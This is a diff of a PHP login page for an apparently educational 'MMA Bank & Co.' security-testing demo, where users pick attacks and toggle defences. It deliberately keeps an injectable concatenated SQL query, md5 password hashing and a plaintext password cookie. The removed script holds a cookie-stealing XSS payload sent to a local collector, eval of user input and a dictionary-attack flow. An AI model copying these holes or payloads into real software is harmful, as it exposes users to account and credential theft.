@@ -7,17 +7,61 @@
 	}
 ?>
 
+<?php
+
+    include_once('singleton/database.php');
+
+    if($_SERVER["REQUEST_METHOD"] == "POST") {
+
+        $name= $_POST['login'];
+        $pass= $_POST['pass'];
+        $prevent_injection_sql= isset($_POST['sql'])?"yes":"no";
+        $prevent_xss_attack= isset($_POST['xss'])?"yes":"no";
+
+        $con = Database::getConnection();
+
+        if($prevent_injection_sql == "yes"){
+            $nameclean = filter_var($name, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH);
+            $passclean = filter_var($pass, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH);
+            $hash=md5($passclean);
+            $req = $con->prepareDB("SELECT * FROM users WHERE login = ? AND pass = ?") ;
+            $req->bindParam(1, $nameclean);
+            $req->bindParam(2, $hash);
+            $req->execute();
+        } else {
+            $hash=md5($pass);
+            $query = "SELECT * FROM users WHERE login = '".$name."' AND pass = '".$hash."'";
+            $req = $con->queryDB($query);
+        }
+
+        $result = $req->fetch(PDO::FETCH_ASSOC);
+
+        if($result){
+            
+            $cookie_name_username = "username";
+            $cookie_value_username = $name;
+            setcookie($cookie_name_username, $cookie_value_username, time() + (86400 * 30), "/");
+
+            $cookie_name_password = "password";
+            $cookie_value_password = $pass;
+            setcookie($cookie_name_password, $cookie_value_password, time() + (86400 * 30), "/");
+
+            $_SESSION["token"] = md5(date("mm-dd-yyyy"));
+            $_SESSION["connected"] = true;
+            $_SESSION["idUser"] = $result['id'];
+            $_SESSION["xss"] = $prevent_xss_attack;
+
+            header("location: ./accounts.php");
+
+        }else{
+            //echo "<h3 style=\"text-align:center;\">Login/Password incorrect</h3>";
+            $error = "Login/Password incorrect";
+        }
+    }
+?>
+
 <div class="section col-md-6 col-md-offset-3">
     <h1 style="text-align:center">MMA Bank & Co.</h1>
-    <div class="row">
-
-        <div class="col-md-10 col-md-offset-1">
-            
-            <div id="displayWithoutSecurity"></div>
-
-        </div>
-        
-    </div>
 
     <div class="row">
     
@@ -25,7 +69,7 @@
             
             <?php if(!isset($_SESSION) || count($_SESSION) == 0){ ?>
             <h3 style="text-align:center;">To see your accounts, please enter your login</h3>
-            <form id="formWithoutSecurity" action="processorWithoutSecurity.php" method="post" onSubmit="return submitCheck();">
+            <form id="formWithoutSecurity" action="" method="post" onSubmit="return submitCheck();">
                 <div class="form-group">
                   <label for="labelLogin">Login</label>
                   <input type="text" class="form-control" id="loginWithoutSecurity" placeholder="Login" name="login">
@@ -34,8 +78,17 @@
                   <label id="labelPasswordWithoutSecurity" for="labelPassword">Password</label>
                   <input type="password" class="form-control" id="passwordWithoutSecurity" placeholder="Password" name="pass">
                 </div>
-                
-                <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-primary">Connect</button>
+
+                <div class="row">
+
+                    <div class="col-md-10 col-md-offset-1">
+                        
+                        <div id="display-errors" class="bg-danger message"><?php if(isset($error)) echo $error; ?></div>
+                        <div id="display-loader" style="text-align:center;"></div>
+
+                    </div>
+                    
+                </div>
 
                 <div class="h3 dropdown">Select your attack <i class="mdi mdi-menu-down pull-right"></i></div>
                 <div id="radio-group" class="radio-group red" style="display:none">
@@ -65,6 +118,8 @@
                         <label><input type="checkbox" id="cb-dic" value="">Prevent Dictionary and/or Brute Force attacks</label>
                     </div>
                 </div>
+
+                <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-primary">Connect</button>
             </form>
             <?php } else {
 
@@ -78,7 +133,7 @@
                 <div class="account-infos">
                     <img src="<?= $row["img"]; ?>" alt="..." class="img-rounded" width="140" height="140">
                     <h3 >Welcome <?= $row["login"]; ?></h3>
-                    <a class="btn btn-primary">Show my accounts</a>
+                    <a class="btn btn-primary" href="./accounts.php">Show my accounts</a>
                     <a class="btn btn-default" href="./insert/insert.php">Insert accounts or user</a>
                 </div>
                 
@@ -101,164 +156,7 @@
     
 </div>
 
-<script>
-$(document).ready(function(){
-    $(".dropdown").click(function(){	
-        var mdi = $(this).find(".mdi");
-    
-        if(mdi.hasClass("mdi-menu-down")){
-            mdi.removeClass("mdi-menu-down");
-            mdi.addClass("mdi-menu-up");
-        }
-        else{
-            mdi.removeClass("mdi-menu-up");
-            mdi.addClass("mdi-menu-down");
-        }
-        $(this).next(".radio-group").slideToggle();
-    });
-
-    /* XSS Attack - Put malicious JS in login input */
-    $('input[type=radio][name=attack]').change(function() {
-        switch(this.value){
-            case 'xss-attack' :
-                $("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
-                break;
-        }
-    });
-    
-    $('#cb-dic').change(function() {
-        if($(this).is(":checked")){
-            $("#passwordWithoutSecurity").addClass("protected");
-            checkPasswordValid($("#passwordWithoutSecurity"));
-            $("#labelPasswordWithoutSecurity").html("Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min");
-        }
-        else{
-            $("#passwordWithoutSecurity").removeClass("protected");
-            $("#passwordWithoutSecurity").parent().removeClass("has-error");
-            $("#submitWithoutSecurity").removeClass("disabled");
-            $("#labelPasswordWithoutSecurity").html("Password");
-        }
-    });
-    
-    
-    /* Handle the event when writting the password */
-    $('#passwordWithoutSecurity').keyup(function(){
-        checkPasswordValid($(this));
-    });
-    
-    function checkPasswordValid(el){
-        if($(el).hasClass("protected")){
-            var inputVal = $(el).val();
-            //var div = $('#divWithoutSecurity')[0];
-            //var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
-            var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
-            if(!regex.test(inputVal)) {
-                console.log("Not good enough ...");
-                $('#divWithoutSecurity').removeClass("has-success");
-                $('#divWithoutSecurity').addClass("has-error");
-                $('#submitWithoutSecurity').addClass("disabled");
-            }else{
-                console.log("Good !!!");
-                //div.removeClass().addClass("form-group has-success");
-                $('#divWithoutSecurity').removeClass("has-error");
-                $('#divWithoutSecurity').addClass("has-success");
-                $('#submitWithoutSecurity').removeClass("disabled");
-            }
-        }
-    }
-
-    /* clear everything */
-    $('#clear').click(function(){
-
-        if (!!$.cookie('username')) {
-            $.removeCookie('username', { path: '/' });
-        }
-
-        if (!!$.cookie('password')) {
-            $.removeCookie('password', { path: '/' });
-        }
-
-        $("#displayWithoutSecurity").html("");
-        $("#formWithoutSecurity")[0].reset();
-    });
-
-});
-
-function submitCheck(){
-    if($("#submitWithoutSecurity").hasClass("disabled"))
-        return false;
-    
-    if($("#rb-dictionary").is(":checked")){
-        var login = $("#loginWithoutSecurity").val();
-        var dataString = 'login='+ login;
-        if(login == '')
-        {
-            $("#displayWithoutSecurity").html("<h4 class='bg-danger message'>Need a login at least</h4>");
-            return false;
-        }
-        else
-        {
-            $("#displayWithoutSecurity").html("Searching in progress...");
-            $.ajax({
-                type: "POST",
-                url: "dictionaryattack/dictionary.php",
-                data: dataString,
-                cache: false,
-                success: function(result){
-                    result = result.split("&*###*&");
-                    var data = result[0];
-                    var name = result[1];
-                    var pass = result[2];
-                    $("#displayWithoutSecurity").html(data);
-                    $("#loginWithoutSecurity").val(name);
-                    $("#passwordWithoutSecurity").val(pass);
-                    $("#rb-none").attr("checked", "checked");
-                    setTimeout(function(){
-                        $("#formWithoutSecurity").submit();
-                    }, 2000);
-                }
-            });
-            return false;
-        }
-    } 
-    else {
-        var login = $("#loginWithoutSecurity").val();
-        var pass = $("#passwordWithoutSecurity").val();
-        var prevent_sql = "no";
-
-        if($("#cb-sql").is(':checked')){
-            prevent_sql = "yes";
-        }
-
-        if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
-            try {
-                eval(login);
-            } catch (err) {
-                console.log("message : " + err + " and is not a javascript function");
-            }
-
-            try {
-                eval(pass);
-            } catch (err) {
-                console.log("message : " + err + " and is not a javascript function");
-            }
-        }
-        
-        var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
-        if(login == '' || pass == '')
-        {
-            $("#displayWithoutSecurity").html("<h4 class='bg-warning message' >Please fill all fields</h4>");
-            return false;
-        }
-        else
-        {
-            if($("#rb-include").is(":checked")){
-                window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
-            }
-            return true;
-        }
-    }				
-}
-</script>
+<!-- Our JS -->
+<script src="js/myJS.js"></script>
 
 <?php include("footer.php"); ?>
